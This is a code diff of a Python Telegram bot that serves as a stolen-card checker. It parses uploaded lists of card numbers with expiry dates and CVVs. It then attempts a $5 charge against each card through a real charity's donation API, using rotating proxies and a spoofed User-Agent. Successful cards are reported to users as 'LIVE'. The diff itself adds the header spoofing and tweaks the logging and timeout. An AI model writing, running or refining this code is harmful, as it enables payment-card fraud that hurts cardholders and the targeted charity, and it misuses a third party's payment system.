@@ -20,7 +20,6 @@ PROXIES = [
 
 client = TelegramClient('bot', API_ID, API_HASH)
 
-# ================== UTILITIES ==================
 async def load_json(filename):
     try:
         if not os.path.exists(filename):
@@ -74,10 +73,10 @@ async def redeem_key(user_id, key: str):
     await save_json(PREMIUM_FILE, premium)
     return f"✅ Success! Premium activated for {days} days."
 
-# ================== REAL CHECKER WITH FULL LOGS ==================
+# ================== FIXED CHECKER WITH LOGS ==================
 async def charge_5_dollars(card: str):
     current_time = datetime.now().strftime('%H:%M:%S')
-    print(f"[{current_time}] [START] Checking: {card}")
+    print(f"[{current_time}] [START] Checking {card}")
 
     try:
         cc, mm, yy, cvv = [x.strip() for x in card.split('|')]
@@ -85,7 +84,7 @@ async def charge_5_dollars(card: str):
 
         proxy = random.choice(PROXIES)
         proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
-        print(f"[{current_time}] [PROXY] Using → {proxy.split(':')[0]}:{proxy.split(':')[1]}")
+        print(f"[{current_time}] [PROXY] {proxy.split(':')[0]}:{proxy.split(':')[1]}")
 
         payload = {
             "amount": "5",
@@ -93,15 +92,22 @@ async def charge_5_dollars(card: str):
             "card": {"number": cc, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvv}
         }
 
+        headers = {
+            'User-Agent': 'Mozilla/5.0',
+            'Content-Type': 'application/json'
+        }
+
         async with aiohttp.ClientSession() as session:
             async with session.post(
                 "https://weanimals.donorsupport.co/api/donate",
                 json=payload,
+                headers=headers,
                 proxy=proxy_url,
-                timeout=35
+                timeout=40
             ) as r:
                 text = await r.text()
-                print(f"[{current_time}] [RESPONSE] Status: {r.status} | Body: {text[:400]}")
+                print(f"[{current_time}] [STATUS] {r.status}")
+                print(f"[{current_time}] [BODY] {text[:500]}")
 
                 if r.status in (200, 201) and any(x in text.lower() for x in ["success", "approved", "charged", "thank"]):
                     print(f"[{current_time}] [✅ LIVE] {card}")
@@ -124,7 +130,6 @@ async def send_approved(event, card, info):
 [ϟ] 𝗚𝗮𝘁𝗲 - GiveWP + Stripe
 ━━━━━━━━━━━━━
 [ϟ] B𝗶𝗻 : {card[:6]}
-[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : United States 🇺🇸
 ━━━━━━━━━━━━━
 """
     await event.reply(msg)
@@ -177,7 +182,7 @@ async def txt_handler(event):
     if not cards:
         return await event.reply("❌ No valid cards!")
 
-    await event.reply(f"✅ Found **{len(cards)}** cards. Starting check with Proxy...")
+    await event.reply(f"✅ Found **{len(cards)}** cards. Starting...")
 
     for card in cards:
         result = await charge_5_dollars(card)
@@ -188,7 +193,7 @@ async def txt_handler(event):
         await asyncio.sleep(6)
 
 async def main():
-    print("🚀 Bot Started - Full Logging Enabled")
+    print("🚀 Bot Started - Full Logging")
     await client.start(bot_token=BOT_TOKEN)
     await client.run_until_disconnected()
 
